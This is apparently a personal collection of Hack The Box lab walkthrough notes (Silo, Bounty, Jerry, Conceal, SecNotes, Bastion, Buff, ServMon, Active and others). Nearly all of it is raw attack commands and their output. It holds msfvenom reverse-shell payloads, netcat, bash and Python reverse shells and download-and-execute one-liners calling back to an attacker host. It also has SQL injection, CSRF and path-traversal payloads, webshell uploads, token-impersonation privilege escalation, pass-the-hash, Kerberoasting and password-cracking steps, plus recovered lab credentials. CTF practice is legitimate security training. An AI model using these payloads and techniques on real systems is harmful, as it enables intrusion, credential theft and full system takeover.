>copy \\10.10.14.6\asd\churrasco.exe
>churrasco.exe
>churassco.exe whoami
>churrasco -d "cmd.exe"
>whoami
	#unstable shell
	#try to type exit magically work
>exit
>whoami
	nt authority\system
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9191 -f exe -o b.exe
>copy \\10.10.14.6\asd\b.exe
>churrasco -d "b.exe"
nc -lvp 9191
>whoami
	nt authority\system









Silo Hackthebox
=======================================
sudo autorecon 10.10.10.82
	#change space to :
cat asd| sed -e 's/\s/:/g' | cut -d ':' -f 5,7 > user.txt
	#base64 line
while IFS= read -r line; do echo -n $line | base64; done < user.txt > auth
mousepad auth
	##oracle database port 1521
nmap --script "oracle-tns-version" -p 1521 -T4 -sV 10.10.10.82
	#version 11.2.0.2.0
	#bruteforce SID
hydra -L sids-oracle.txt -s 1521 10.10.10.82 oracle-sid
	#offline crack oracle
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=XE -n 10.10.10.82
	#powerfull shit oracle pentest tool known as ODAT (oracle database attacking tools)
	#install odat
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
cd /opt/oracle/
	#download installclient-basic.rpm installclient-sqlplus.rpm installclient-devel.rpm
wget http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html
sudo apt-get install libaio1 python3-dev alien python3-pip
sudo alien --to-deb *.rpm
sudo dpkg -i *.deb
nano /etc/profile
	export ORACLE_HOME=/usr/lib/oracle/21/client64/
	export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
	export PATH=${ORACLE_HOME}bin:$PATH
nano /etc/ld.so.conf.d/oracle.conf
	/usr/lib/oracle/21/client64/lib/
ldconfig
pip3 install cx_Oracle
python3 odat.py
which sqlplus
sqlplus -V
	##pentest with odat
	#bruteforce sid oracle
odat sidguesser -s 10.10.10.82
	#got valid SID XE,CLRExtProc,PLSExtProc
	#bruteforce user
python3 odat.py all -s 10.10.10.82 -p 1521 -d XE
nmap -sT -p 1521 -Pn --script oracle-brute --script-args "unpwdb.timelimit=3h,oracle-brute.sid=XE,userdb=users-oracle.txt,passdb=pass-oracle.txt" 10.10.10.82
	#got credz scott:tiger
python3 odat.py all -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger
sqlplus SCOTT/tiger@10.10.10.82:1521/XE
>select * from user_role_privs;
>select * from cat;
>select banner from v$version;
	#login as sysdba
sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
>select * from user_role_privs;
	#got all priv
	#oracle reverse shell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9191 -f exe -o b.exe
python3 odat.py all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
python3 odat.py utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile 'C:\' a.exe b.exe
python3 odat.py externaltable -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --exec 'C:\' a.exe
rlwrap nc -lvp 9191
>whoami
	nt authority\system
	#aspx reverse shell
wget https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
python3 odat.py utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile C:\\inetpub\\wwwroot rev.aspx rev.aspx
curl http://10.10.10.82/rev.aspx
rlwrap nc -lvp 9292
>whoami
	iis apppool\defaultapppool
>whoami /priv
	#privesc SeImpersonatePrivilege
	#Microsoft Windows Server 2012 R2 Standard
	#6.3.9600 N/A Build 9600
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
rlwrap nc -lvp 4321
>whoami
	nt authority\system
	##another insane privesc memory dump memdump
	#https://github.com/volatilityfoundation/volatility
>type "c:\Users\Phineas\Desktop\Oracle issue.txt"
>copy "Oracle issue.txt" \\10.10.14.6\asd\oracle.txt
mousepad oracle.txt
gedit oracle.txt
	#got valid password £%Hm8646uC$
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
unzip SILO-20180105-221806.zip
	#scan header krgb
./volatility_2.6_lin64_standalone kdbgscan -f SILO-20180105-221806.dmp
	#automatic scan header krgb
./volatility_2.6_lin64_standalone imageinfo -f SILO-20180105-221806.dmp
	#investigate dump
./volatility_2.6_lin64_standalone -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
	#there are SYSTEM and SAM so dump the hash
./volatility_2.6_lin64_standalone -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump
	#got Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
	#pass the hash
evil-winrm -i 10.10.10.82 -u 'administrator' -H '9e730375b7cbcebf74ae46481e07b0c7'
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82
>whoami
	nt authority\system






Bounty Hackthebox
====================================
sudo autorecon 10.10.10.93
cat tcp_80_http_dirb.txt
http://10.10.10.93/transfer.aspx
	##abuse file upload
	#fuzz extention with extention payload with burp
	#https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4
	#extention allowed jpg, png, jpeg, xls, doc, xlsx, docx, config
	##web.config RCE IIS 6 & 7
	#https://soroush.secproject.com/blog/tag/unrestricted-file-upload/
	#https://payloads.online/archivers/2018-11-04/1/
%@ Language=VBScript %>
<% call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c whoami") %>
	#another script with output
<% Response.write("-"&"->")
Response.write("")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("ipconfig")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("<!-"&"-") %>
	#web.config reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
	#change wShell.Exec("\\10.10.14.6\asd\rshell.exe")
rlwrap nc -lvp 4321
>whoami
	bounty\merlin
>whoami /priv
	#seimpoersonateprivilege privesc
	#Microsoft Windows Server 2008 R2 Datacenter
	#6.1.7600 N/A Build 7600
>mkdir temp
cd c:\temp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
rlwrap nc -lvp 4321
>whoami
	nt authority\system






Jerry Hackthebox
======================================
sudo autorecon 10.10.10.95
http://10.10.10.95:8080
	#tomcat 7.0.88
	#bruteforce tomcat
wget https://gist.github.com/th3gundy/d562eb1ae5dc42d666d3aab761bd4d96#file-tomcat_bruteforce-py
python tomcat_bruteforce.py --host 10.10.10.95 --port 8080 --path /manaer/html --usr user.txt --pwd password.txt
	#got credz admin:admin, tomcat:s3cret
	#user admin as manager-status (view only)
	#user tomcat as manager-gui, so login as tomcat:s3cret
http://10.10.10.95:8080/manager/html
	#tomcat webshell
https://github.com/BustedSec/webshell/blob/master/webshell.war
http://10.10.10.95:8080/webshell/index.jsp?cmd=whoami	
	#tomcat reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4321 -f exe > rshell.exe
http://10.10.10.95:8080/webshell/index.jsp?cmd=\\10.10.14.7\asd\rshell.exe
rlwrap nc -lvp 4321
	#tomcat war reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4141 -f war -o rshell.war
http://10.10.10.95:8080/rshell
rlwrap nc -lvp 4141
>whoami
	nt authority\system










Conceal Hackthebox
======================================
sudo autorecon 10.10.10.116
	#only udp 161 (snmp) and 500 (ipsec)
cat udp_161_snmp_snmpwalk*
	#read snmp in better format with snmp-check
	#community public is default, bruteforce community with snmp onesixtyone
cat udp_161_snmp_onesixtyone.txt
snmp-check 10.10.10.116 -c public
	#got IKE VPN password PSK 9C8B1A372B1878851BE2C097031B6E43 (Dudecacke1!)
	#enumerate udp port 500
	#tunnel to ipsec udp 500 to connect local network
ike-scan -M 10.10.10.116
ike-scan -M --ikev2 10.10.10.116
	#Internet Key Exchange (IKE) is encrypted with triple DES, using SHA1 hash, and modp1024
	#auth using PSK (preshared key) and IKE v1
which ipsec (strongswan)
cat /etc/ipsec.secrets
	%any : PSK "Dudecake1!"
cat /etc/ipsec.conf
	conn Conceal
        authby=secret
        auto=route
        keyexchange=ikev1
        ike=3des-sha1-modp1024
        left=10.10.14.7
        right=10.10.10.116
        type=transport
        esp=3des-sha1
        rightprotoport=tcp
	#got error 3DES_CBC (key size 0) not supported!
	#install strongswan plugins
sudo apt-get install libstrongswan-standard-plugins
sudo apt-get install libstrongswan-extra-plugins
	#start ipsec tunnel
sudo ipsec start --nofork
	#load configuration
sudo ipsec up Conceal
	#tunnel is open, scan nmap with -sT for scan across ipsec for more accurate
nmap -p- -Pn 10.10.10.116 -v -sT --min-rate 1000
gobuster -u http://10.10.10.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,aspx,asp,html
http://10.10.10.116/upload/
ftp 10.10.10.116
>mkdir asd
>cd asd
>put webshell.asp
	#upload webshell https://github.com/tennc/webshell/blob/master/asp/webshell.asp
http://10.10.10.116/upload/
	#improve connection tunnel inside tunnel
	#ipsec Conceal inside vpn htb in tun0
	#default mtu 1500 and idk how on earth decrease mtu tun0 (htb vpn) increase ipsec connection
sudo ifconfig tun0 mtu 1000
http://10.10.10.116/upload/webshell.asp
	#simple asp shell
cat simpecmd.asp
	<% Set rs = CreateObject("WScript.Shell")
	Set cmd = rs.Exec("cmd /c whoami")
	o = cmd.StdOut.Readall()
	Response.write(o) %>
http://10.10.10.116/upload/asd/simplecmd.asp
	#webshell reverse shell powershell nishang
	#https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
mv Invoke-PowerShellTcp.ps1 rev.ps1
	#add revese script in end of line
tail -n 1 rev.ps1
	Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 4321
http://10.10.10.116/upload/webshell.asp
	powershell -c iex(New-Object Net.Webclient).downloadstring("http://10.10.14.7/rev.ps1")
	#try to change double quote to single quote due webshell code adjustment
	powershell -c iex(New-Object Net.Webclient).downloadstring('http://10.10.14.7/rev.ps1')
rlwrap nc -lvp 4321
>whoami
	conceal\destitute
>whoami /priv
	#SeImpersonatePrivilege privesc
	#Microsoft Windows 10 Enterprise
	#10.0.15063 N/A Build 15063
	#upload juicypotato
ftp 10.10.10.116
>cd asd
>binary
>put jp.exe
>put nc.exe
>put rev.vat
>cd \
>mkdir temp
>cd \temp
>cp \inetpub\wwwroot\upload\asd\* .
	#use two type of rev.bat
>type rev.bat
	powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')
	\temp\nc.exe -e cmd.exe 10.10.14.7 9191
	#change shell using cmd for better 
>.\nc.exe -e cmd.exe 10.10.14.7 4444
rlwrap nc -lvp 4444
>cd \temp\
>jp.exe -t * -p \temp\rev.bat -l 9001
	#use windows 10 enterprise CLSID
	#https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/
>jp.exe -t * -p \temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
rlwrap nc -lvp 9191
>whoami
	nt authority\system




Chatterbox Hackthebox
=====================================
	##gave up to get rce on this Achat buffer overflow
	##so i taking notes from writeup that might be helpful
	#msfvenom option
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp --list-options
	#msfvenom ping
msfvenom -a x86 --platform Windows -p windows/exec CMD='ping.exe 10.10.14.29' -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
	#msfvenom certutil
-p windows/exec CMD='cmd /k "certutil -f -split -urlcache http://10.10.14.29/shell443.exe C:\Users\Public\Documents\shell443.exe && C:\Users\Public\Documents\shell443.exe"'
	#check .NET framwork version
>dir C:\Windows\Microsoft.NET\Framework
	#administrator desktop accessable but file access denied
>icacls Desktop\
	CHATTERBOX\Alfred:(I)(OI)(CI)(F)
>icacls Desktop\ /grant Alfred:F /T
	#windows su user Administrator:Welcome1!
tail script.ps1 
	$secpasswd = ConvertTo-SecureString "Welcome1!" -AsPlainText -Force 
	$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd)
	Start-Process -FilePath "powershell.exe" -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/rshell.ps1')" -Credential $mycreds
>whoami
	chatterbox\administrator
	#privesc high privilege to system
>cmd /c "set"
>cmd /c "set"
>start PsExec.exe -i -d -accepteula -s C:\Windows\Temp\Temp\rshell.exe
rlwrap nc -lvp 4242
>whoami
	nt authority\system









Secnotes Hackthebox
=========================================
sudo autorecon 10.10.10.97
http://10.10.10.97/login.php
http://10.10.10.97/register.php
	#register user asd:asdasd
http://10.10.10.97/contact.php
	#fill with http://10.10.14.2/asd
nc -lvp 80
	#I got connection back
	##abuse CSRF
http://10.10.10.97/change_pass.php
	#try to change pass with GET request and success
	#CSRF with change password
http://10.10.10.97/contact.php
	http://127.0.0.1/change_pass.php?password=dsadsa&confirm_password=dsadsa&submit=submit
http://10.10.10.97/login.php
	login as tyler
	#got credz Tyler / 92g!mA8BGjOirkL%OG*&
	##another method second order SQL injection
http://10.10.10.97/register.php
	#register with this account
	#https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Generic-SQLi.txt
	a' UNION SELECT 101,102,@@version,104#
	a' UNION SELECT 101,102,database(),104#
	a' or 1=1-- -
	a' or 0=0 #"
http://10.10.10.97/login.php
http://10.10.10.97/home.php
	#got all notes in database and credz Tyler / 92g!mA8BGjOirkL%OG*&
	#login smb
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
smbclient \\\\10.10.10.97\\new-site -U 'tyler'
>dir
>put p0wny.php
http://10.10.10.97:8808/p0wny.php
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4242 -f exe > rshell.exe
http://10.10.10.97:8808/p0wny.php
	certutil -urlcache -split -f http://10.10.14.2/rshell.exe
	dir .\rshell.exe
rlwrap nc -lvp 4242
>whoami
	secnotes\tyler
cp ../anthem/winpeas.exe .
>cd /temp/
>certutil -urlcache -split -f http://10.10.14.2/winpeas.exe
>winpeas.exe
>cd cd \Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root\
>dir
	.bashrc
	.bash_history
>type .bash_history
	smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
	#got credz administrator:u6!4ZwgwOM#^OBf#Nwnh
smbmap -H 10.10.10.97 -u 'administrator' -p 'u6!4ZwgwOM#^OBf#Nwnh'
smbclient \\\\10.10.10.97\\C$ -U 'administrator'
>smb: \users\administrator\desktop\> get root.txt
	#shell smb administrator
	#psexec required smb default 445 as administrator write/read ADMIN$ and RCP
psexec.py 'administrator':'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
>whoami
	nt authority\system
	##another method abuse wsl and get wsl shell
>whoami
	secnotes\tyler
	#check .NET Framework version to see which winpeas could run
>dir C:\Windows\Microsoft.NET\Framework
>cd \users\tyler\desktop
>type bash.lnk
>copy bash.lnk \\10.10.14.2\asd\
strings bash.lnk
>dir \windows\system32\bash.exe
	#not found search file windows
>where /R c:\ bash.exe
>where /R c:\ wsl.exe
	#wsl reverse shell
wsl.exe whoami
	root
wsl.exe python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
wsl.exe python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
exec bash --login
nc -lvp 4444
>whoami
	root
	#full interactive shell
^Z
stty raw -echo
fg
>cat .bash_history
	#abuse wsl with bash.exe
	#change shell to more stable with nc.exe
>certutil -urlcache -split -f http://10.10.14.2/nc.exe
>nc.exe -e cmd 10.10.14.2
>where /R c:\ bash.exe
>bash.exe -c "ping 10.10.14.2"
	#wsl bash reverse shell
>bash.exe -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8888 >/tmp/f"
nc -lvp 8888
>id
	#another bash interactive wsl
>bash.exe
>>id
	uid=0(root) gid=0(root) groups=0(root)
>>python -c 'import pty;pty.spawn("/bin/bash")'
	#wsl bash reverse shell
>>bash -i >& /dev/tcp/10.10.14.2/9292 0>&1
exec bash --login
nc -lvp 4444
>^Z
stty raw -echo
fg
>id
>python -c 'import pty;pty.spawn("/bin/bash")'
	#full interactive shell
>exit








Bastion Hackthebox
========================================
sudo autorecon 10.10.10.134
cat smbmap-list-contents.txt
smbclient --list \\10.10.10.134 -U 'anonymous'
smbclient \\\\10.10.10.134\\backups
>get note.txt
>cd WindowsImageBackup
>cd L4mpje-PC
>cd "Backup 2019-02-22 124351"
>dir
	#there is file.vhd (virtual hard drive) which I can dump SAM and SYSTEM
	#transfer large file smb using curl
curl -T file.txt -u "domain\username:passwd" smb://server.example.com/share/
curl -u "domain\username:passwd" smb://server.example.com/share/file.txt
curl -u "domain\anonymous:asd" 'smb://10.10.10.134/backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' > asd1.vhd
	#try to download 5GB .vhd file and it seems imposimble
sudo su
apt install libguestfs-tools -y
guestmount --add smb/asd1.vhd --inspector --ro -v mnt/vhd1
guestunmount vhd1
	#mount smb to kali
mkdir mnt
mount -t cifs //10.10.10.134/backups mnt/ -o user=anonymous,password=
guestmount --add mnt/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro mnt
	#took like fcking 15 minutes
copy mnt/Windows/System32/config/SAM \temp
copy mnt/Windows/System32/config/SYSTEM \temp
samdump2 SYSTEM SAM
hashcat -m 1000 --force 26112010952d963c8dc4217daec986d9 /opt/rockyou.txt
	#got credz L4mpje:bureaulampje
ssh l4mpje@10.10.10.134
	##using winpeas
>winpeas.exe
	#there is something in recycle bin
>cd \$Recycle.Bin
>dir /a /b /s
>type *
	NET USE Z: "\\192.168.1.74\Backups" /user:Peter 3RTTT5zNt2
	#got credz peter:3RTTT5zNt2 but useless no user name peter
	##using powerup
>. .\powerup.ps1
>Invoke-AllChecks
	#dll hijack wlbsctrl.dll in C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll
	#dll hijack wlbsctrl.dll check
	#https://github.com/securycore/Ikeext-Privesc
>. .\Ikeext-Privesc.ps1
>Invoke-IkeextCheck
	#not vulnerable (I think wlbsctrl.dll should in C:\Windows\System32\)
	##using seatbelt
>seatbelt.exe -group=all
	#dpapi master keys in C:\Users\L4mpje\AppData\Roaming\Microsoft\Protect\S-1-5-21-2146344083-2443430429-1430880910-1002
>\\10.10.14.2\asd\mimikatz.exe
	#extract master key
	dpapi::masterkey /in:%APPDATA%\Microsoft\Protect\{SID}" /sid:SID /password:pass /protected
#dpapi::masterkey /in:"C:\Users\L4mpje\AppData\Roaming\Microsoft\Protect\S-1-5-21-2146344083-2443430429-1430880910-1002\e5c82a4b-96bd-4a3c-bd2e-550f432b8880" /S-1-5-21-2146344083-2443430429-1430880910-1002 /password:bureaulampje /protected
	#got master key a112e16482caab32436fd1333879a06a976ed8bebd4e2e01647a513950a63fff70f30c91a763c112cf0048716eb4c4b74740a3ce5bfc8501dcfb2426372a93b5
	#extract dpapi password
	dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
#dpapi::cred /in:C:\Users\L4mpje\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:a112e16482caab32436fd1333879a06a976ed8bebd4e2e01647a513950a63fff70f30c91a763c112cf0048716eb4c4b74740a3ce5bfc8501dcfb2426372a93b5
	#nothing found and honestly idk what that was
	##list program manually
>dir "\Program Files (x86)"
	#mRemoteNG privesc
>cd "%userprofile%\AppData\Roaming\mRemoteNG\"
>copy * \\10.10.14.2\asd\
cat * | grep -i password
	#got administrator password string
	aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
wget https://github.com/haseebT/mRemoteNG-Decrypt
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
	Password: thXLHM96BeKL0ER2
ssh administrator@10.10.10.134
>whoami
	bastion\administrator
smbmap -H 10.10.10.134 -u 'administrator' -p 'thXLHM96BeKL0ER2'
	#got ADMIN$ access so can remote with psexec
psexec.py 'administrator':'thXLHM96BeKL0ER2'@10.10.10.134
>whoami
	nt authority\system








Buff Hackthebox
=======================================
sudo autorecon 10.10.10.198
http://10.10.10.198:8080/contact.php
view-source:http://10.10.10.198:8080/contact.php
	#Made using Gym Management Software 1.0
searchsploit gym management software
searchsploit -m 48506
python 48506.py
python 48506.py 'http://10.10.10.198:8080/'
>whoami
	buff\shaun
>copy \\10.10.14.2\asd\nc.exe .
	#got error You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol
	#shell are limited try to copy file
	#transfer ftp
pip3 install pyftpdlib
python3 -m pyftpdlib
	#on windows limited rce
echo open 10.10.14.2 > asd.txt
echo USER anonymous asd >> asd.txt
echo bin >> asd.txt
echo get nc.exe >> asd.txt
echo GET sel.php >> asd.txt
echo quit >> asd.txt
>ftp -v -i -n -s:asd.txt
	#ftp no error but file not trasnfered
	#add proxy to exploit (exploit proxy)
	#try to set burp bind address 127.0.0.1:8888 but fail so change the exploit code
	#https://stackoverflow.com/questions/30837839/how-can-i-set-a-single-proxy-for-a-requests-session-object
cat ex.py
    proxies = {'http': 'http://127.0.0.1:8080'}
    s = requests.Session()
    s.proxies.update(proxies)
python ex.py 'http://10.10.10.198:8080/'
	#intercept with burp and change payload with php reverse shell
	#https://github.com/ivan-sincek/php-reverse-shell
curl http://10.10.10.198:8080/upload/asdasd.php
rlwrap nc -lvp 4242
>whoami
	buff\shaun
	#after i read someone writeup, we can use smb transfer using smbv2
impacket-smbserver asd . -smb2support
python 48506.py 'http://10.10.10.198:8080/'
>copy \\10.10.14.2\asd\nc.exe
>nc.exe -e cmd.exe 10.10.14.2 4242
rlwrap nc -lvp 4242
>whoami
	buff\shaun
>winpeas.exe
>cd \users\shaun
>dir /a /b /s | findstr /V /i appdata
	C:\Users\shaun\Downloads\CloudMe_1112.exe
	#exploit CloudMe_1112.exe cloudme buffer overflow privesc
	#https://www.exploit-db.com/exploits/48389
>systeminfo
	#Microsoft Windows 10 Enterprise
	#10.0.17134 N/A Build 17134
>tasklist -V | findstr /i cloudme
>netstat -ano
	#on winpeas target already listen tcp 127.0.0.1:8888
	#windows port porward using plink.exe
locate plink.exe
	#plink error "FATAL ERROR: Couldn't agree a key exchange algorithm" so download latest exe from here
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
sudo service ssh start
	#change sshd_config to port 2222 because default vpn hackthebox block outbound port 22
sudo nano /etc/ssh/sshd_config
>echo y | plink.exe -l kali -pw kali -R 8888:127.0.0.1:8888 10.10.14.2 -P 2222
>>id
	uid=1000(kali) gid=1000(kali) groups=1000(kali)
	#got shell back to kali means port been forwarded
msfvenom -p windows/exec CMD='c:\temp\nc.exe -e cmd.exe 10.10.14.2 4141' -b '\x00\x0a\x0d' -f py -v payload
	@change exploit to localhost port 8888
python ex.py
rlwrap nc -lvp 4141
>whoami
	buff\administrator
	#privesc high privilege to system
>PsExec64.exe -i -d -accepteula -s C:\temp\nc.exe 10.10.14.2 9191 -e cmd.exe
rlwrap nc -lvp 9191
>whoami
	nt authority\system




Servmon Hackthebox
========================================
sudo autorecon 10.10.10.184
cat tcp_21_ftp_nmap.txt
ftp -p 10.10.10.184
>anonymous
>get "Notes to do.txt"
>get Confidential.txt
	#there are 2 users nadine,nathan and there are Passwords.txt on desktop
https://10.10.10.184:8443
	#nsclient web interface
searchsploit nsclient
searchsploit -m 48360
python3 48360.txt
	#try to exploit it, change password, payload, etc fail
	#unfortunedly autorecon didn't find port 80 and it takes hours to do nmap again
nmap -p- -Pn --min-rate 10000 10.10.10.184
http://10.10.10.184/Pages/login.htm
	#exploit nvms 1000
searsploit -m 47774
cat 47774.txt
	#NVMS-1000 - Directory Traversal
	GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
	#got credz L1k3B1gBut7s@W0rk
	#I know main exploit of this box is nsclient but I can't get config file using LFI
	#and default config file in C:\program files\nsclient++\nsclient.ini
GET /../../../../../../../../../../../../program files/nsclient++/nsclient.ini HTTP/1.1
	#after I read writeup (of course I finished it first) LFI payload should encode with URL
GET /../../../../../../../../../../../../program+files/nsclient%2b%2b/nsclient.ini HTTP/1.1
	password = ew2x6SsGTxjRwXOT
	allowed hosts = 127.0.0.1
hydra -L user.txt -P pass.txt 10.10.10.184 -t 4 ssh
ssh nadine@10.10.10.184
>whoami
	servmon\nadine
>cd C:\program files\nsclient++\
>nscp web -- password --display
>type nsclient.ini
	#so nsclient allowen only from 127.0.0.1
	#ssh port forward
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
https://127.0.0.1:8443
	#now nsclient web interface works
>copy \\10.10.14.2\asd\nc.exe \temp\
	#finaly exploit nsclient
python3 48360.txt -t 127.0.0.1 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c '\temp\nc.exe -e cmd 10.10.14.2 4141'
rlwrap nc -lvp 4141
>whoami
	nt authority\system
	#after I read write, there is no script at the time and access nsclient with chronium
	#so the step to execute shell are
>type evil.bat
	@echo off
	C:\Users\Nadine\Downloads\nc.exe 10.10.14.27 443 -e cmd.exe
	
	#file transfer evade defender
	#https://github.com/ivanitlearning/CTF-Repos/blob/master/HTB/Servmon/File-transfer.md








Active Hackthebox
=======================================
sudo autorecon 10.10.10.100
GetNPUsers.py -dc-ip 10.10.10.100 active.htb/SVC_TGS
	No entries found!
smbmap-share-permissions.txt
smbclient \\\\10.10.10.100\\Replication
> recurse ON
> prompt OFF
> mget *
> exit
cd smbdump
find . -type f
cat cat active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
	#extract and decrypt cpassword from Group Policy Preferences
	#https://github.com/t0thkr1s/gpp-decrypt
python3 gpp-decrypt.py -f groups.xml
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
	#got credz active.htb\SVC_TGS:GPPstillStandingStrong2k18
	#every valid user password check it with smbmap
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
	#attacking kerberos port 88,464
	#with valid user pass try to attack AD by dumpsecret and request SPN
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
	#request spn success but kerberoasting failed
	#Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
	#date attacker with AD doesn't match so adjust kali date
sudo su
sudo apt-get install ntpdate
ntpdate 10.10.10.100
	#SPN still error and ntp also error "the NTP socket is in use, exiting"
ntpdate -u 10.10.10.100
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -save -outputfile hash.txt
	#got administrator hash and put all one line hash to has.txt
hashcat -m 13100 -a 0 hash.txt /opt/rockyou.txt
	#cracked with credz administrator:Ticketmaster1968
smbmap -H 10.10.10.100 -u 'administrator' -p 'Ticketmaster1968'
psexec.py 'administrator':'Ticketmaster1968'@10.10.10.100
	nt authority\system


qweqwe========batas=bawah================


Linux Priviledge Escalation Course
====================================
https://github.com/lamontns/pentest/blob/master/privilege-escalation/linux-privilege-escalation.md
		##kernel expoit dirtycow CVE-2016-5195
